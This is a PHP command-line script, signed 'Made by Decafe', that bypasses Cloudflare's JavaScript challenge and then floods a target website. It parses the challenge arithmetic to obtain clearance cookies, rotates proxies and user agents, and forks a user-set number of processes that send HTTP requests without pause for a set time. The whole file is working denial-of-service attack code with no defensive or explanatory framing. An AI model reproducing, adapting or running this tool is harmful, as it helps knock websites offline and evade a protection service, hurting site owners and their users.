<?php
error_reporting(0);
@ini_set('display_errors', 0);
 if ($argc != 5) {
        echo "Usage: php $argv[0] http://site.com/ (proxy list set to dog if none)(threads)(time)\n";
        die();
}
function get_between($string,$start,$end) {
    $string = " ".$string;
    $ini = strpos($string, $start);
    if($ini==0) return "";
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
 
    return substr($string, $ini, $len);
}
function rand_line($fileName, $maxLineLength = 4096) {
    $handle = @fopen($fileName, "r");
    if ($handle) {
        $random_line = null;
        $line = null;
        $count = 0;
        while (($line = fgets($handle, $maxLineLength)) !== false) {
            $count++;
            if(rand() % $count == 0) {
              $random_line = $line;
            }
        }
        if (!feof($handle)) {
            echo "Error: unexpected fgets() fail\n";
            fclose($handle);
            return null;
        } else {
            fclose($handle);
        }
        return $random_line;
    }
}
function bypassyourdog($domain, $useragent, $proxy) {
	$cURL = curl_init();
	curl_setopt($cURL, CURLOPT_URL, $domain);
	curl_setopt($cURL, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($cURL, CURLOPT_HEADER, 1);
	curl_setopt($cURL, CURLOPT_USERAGENT, $useragent);
	curl_setopt($cURL, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($cURL, CURLOPT_PROXY, $proxy);
	curl_setopt($cURL, CURLOPT_COOKIEFILE, "cookie.txt");
	$string = curl_exec($cURL);
	curl_close($cURL);
	$domain = get_between($string, '</span> ', '.</h1>');
	$jschl_vc = get_between($string, '"jschl_vc" value="', '"/>');
	$pass = get_between($string, '"pass" value="', '"/>');
	$settimeout = get_between($string, 'setTimeout(function(){', 'f.submit()');
	$mathvariables = get_between($settimeout, 'var t,r,a,f, ', ';');
	$mathvariable = explode('=', $mathvariables);
	$mathvariable1 = get_between($mathvariables, '{"', '":');
	$mathvariable2 = $mathvariable[0].".".$mathvariable1;
	$math1 = get_between($mathvariables, '":', '}');
	$math2 = $mathvariable[0].get_between($settimeout, ";".$mathvariable[0], ';a.value');
	$fuck = 0;
	$math2s = explode(';', $math2);
	$mathtotal = 0;
	$answers = array();
	$totalformath1 = 0;
	//echo "Domain: $domain\nJSCHL_VC: $jschl_vc\nPASS: $pass\nSet Timeout: $settimeout\n";
	if($pass == NULL) {
		file_put_contents('log.txt', $string, FILE_APPEND);
	}
	if(get_between($math1, '((', '))') != NULL) {
		$dog311 = get_between($math1, '((', '))');
		$math1ss = explode(')', $dog311);
		$math1sss = explode('+', $math1ss[0]);
		$math1ssss = explode('(', $dog311);
		$math1sssss = explode('+', $math1ssss[1]);
		$ifuckdog = 0;
		$ufuckdog = 0;
		foreach($math1sss as $imoutofvars2) {
			if ($imoutofvars2 == "!" || $imoutofvars2 == "!![]" || $imoutofvars2 == "![]") {
				$ifuckdog++;
			}
		}
		foreach($math1sssss as $imoutofvars3) {
			if ($imoutofvars3 == "!" || $imoutofvars3 == "!![]" || $imoutofvars3 == "![]") {
				$ufuckdog++;
			}
		}
		$totalformath1 = $ifuckdog.$ufuckdog;
		array_push($answers, $totalformath1." +");
	} else {
		$math1ss = explode('+', $math1);
		foreach($math1ss as $fuckmydog){
			if ($fuckmydog == "!" || $fuckmydog == "!![]" || $fuckmydog == "![]") {
				$totalformath1++;
			}
		}
		array_push($answers, $totalformath1." +");
	}
	foreach($math2s as $dog123){
		$typeofmath = substr($dog123, strlen($mathvariable2), 1);
		if(get_between($dog123, '((', '))') != NULL) {
			$dog321 = get_between($dog123, '((', '))');
			$poop = 0;
			$shit = 0;
			$mathss = explode(')', $dog321);
			$mathsss = explode('+', $mathss[0]);
			$mathssss = explode('(', $dog321);
			$mathsssss = explode('+', $mathssss[1]);
			foreach($mathsss as $imoutofvars) {
				if ($imoutofvars == "!" || $imoutofvars == "!![]" || $imoutofvars == "![]") {
					$poop++;
				}
			}
			foreach($mathsssss as $imoutofvars1) {
				if ($imoutofvars1 == "!" || $imoutofvars1 == "!![]" || $imoutofvars1 == "![]") {
					$shit++;
				}
			}
			$fuck = $poop.$shit;
			array_push($answers, $fuck." ".$typeofmath);
			$fuck = 0;
		} else {
			$fuckingdogs = explode('=', $dog123);
			$fuckingcats = explode('+', $fuckingdogs[1]);
			foreach($fuckingcats as $idinglecats) {
				if ($idinglecats == "!" || $idinglecats == "!![]" || $idinglecats == "![]") {
					$fuck++;
				}
			}
			array_push($answers, $fuck." ".$typeofmath);
			$fuck = 0;
		}
	}
	foreach($answers as $answer) {
		$ilikedogs = explode(' ', $answer);
		switch($ilikedogs[1]) {
			case "+":
				$mathtotal = $mathtotal + $ilikedogs[0];
			break;
			case "-":
				$mathtotal = $mathtotal - $ilikedogs[0];
			break;
			case "*":
				$mathtotal = $mathtotal * $ilikedogs[0];
			break;
		}
	}
	$jschl_answer = strlen($domain) + $mathtotal;
	$domain1 = $domain."/cdn-cgi/l/chk_jschl?jschl_vc=$jschl_vc&pass=$pass&jschl_answer=$jschl_answer";
	sleep(4);
	$cURL1 = curl_init();
	curl_setopt($cURL1, CURLOPT_URL, $domain1);
	curl_setopt($cURL1, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($cURL1, CURLOPT_HEADER, 1);
	curl_setopt($cURL1, CURLOPT_USERAGENT, $useragent);
	curl_setopt($cURL1, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($cURL1, CURLOPT_PROXY, $proxy);
	curl_setopt($cURL1, CURLOPT_COOKIEFILE, "cookie.txt");
	$test = curl_exec($cURL1);
	$cfuid = get_between($test, '__cfduid=', '; expires');
	$cf_clearance = get_between($test, 'cf_clearance=', '; expires');
	echo '__cfduid='.$cfuid.'; cf_clearance='.$cf_clearance."\n";
	return '__cfduid='.$cfuid.'; cf_clearance='.$cf_clearance;
}
$useragents = array(
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 
Safari/536.5",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) 
AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
	"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) 
Chrome/20.0.1132.47 Safari/536.11","Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) 
Chrome/19.0.1084.56 Safari/536.5",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11","Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) 
Chrome/19.0.1084.56 Safari/536.5",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11","Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) 
App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1","Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like 
Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; 
rv:1.9.2) Gecko/20100115 Firefox/3.6",
	"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3","Mozilla/4.0 (compatible; MSIE 6.0; Windows 
NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 
SV1; .NET CLR 2.0.50727)",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11","Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 
Firefox/5.0.1", ); $end = time() + $argv[4]; $threads = $argv[3]; echo "Made by Decafe\n"; echo "Starting cf bypass on $argv[1] for $argv[4] seconds with $argv[3] threads\n"; for($i = 
0; $i < $threads; $i ++){
	$pid = pcntl_fork();
	if($pid == -1) {
		echo "Forking failed on $i loop of forking.\n";
		exit();
	} elseif($pid) {
		continue;
	} else {
		if(!(strpos($argv[2], "dog"))) {
				$proxy = rand_line($argv[2]);
		} else {
			$proxy = NULL;
		}
		$ua = $useragents[array_rand($useragents)];
		$bypasscookie = bypassyourdog($argv[1], $ua, $proxy);
		while($end > time()) {
			$flood = curl_init();
			curl_setopt($flood, CURLOPT_URL, $argv[1]);
			curl_setopt($flood, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($flood, CURLOPT_USERAGENT, $ua);
			curl_setopt($flood, CURLOPT_FOLLOWLOCATION, true);
			curl_setopt($flood, CURLOPT_PROXY, $proxy);
			curl_setopt($flood, CURLOPT_COOKIE, $bypasscookie);
			$var123 = curl_exec($flood);
			curl_close($flood);
		}
		die();
	}
}
for($j = 0; $j < $threads; $j++) {
    $pid = pcntl_wait($status);
}
?>
